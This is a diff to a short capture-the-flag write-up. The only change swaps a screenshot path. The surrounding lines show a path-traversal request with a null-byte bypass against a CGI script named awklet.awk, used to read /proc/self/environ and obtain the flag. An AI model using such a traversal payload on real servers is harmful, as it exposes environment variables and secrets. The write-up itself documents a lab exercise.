@@ -27,7 +27,7 @@
 Using a null-byte bypass does exactly that:
 ``` /cgi-bin/awklet.awk?name=x&font=../../../proc/self/environ%00 ```
 
-![Alt text](./pic's/awklet_first_try.png)
+![Alt text](./pic's/awklet_second_try.png)
 
 # Wow, flag! hehe heckkkerr.  
 Thanks for reading.
